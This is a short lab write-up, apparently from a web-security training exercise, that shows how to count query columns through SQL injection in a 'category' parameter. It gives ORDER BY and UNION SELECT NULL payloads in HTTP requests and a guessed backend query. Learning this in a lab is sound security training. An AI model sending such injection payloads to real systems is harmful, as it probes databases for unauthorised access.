# SQL injection UNION attack, determining the number of columns returned by the query

In-band SQLi in the ‘category’ query parameter.

First, determine the number of columns returned by the query using the ORDER BY method:

```http
GET /filter?category=Accessories'+ORDER+BY+3--
```

Next, use a UNION injection to return additional rows containing null values:

```http
GET /filter?category=Accessories'+UNION+SELECT+NULL,NULL,NULL--
```

The query is likely:

```sql
SELECT id, name, price FROM products WHERE category='Accessories';
```
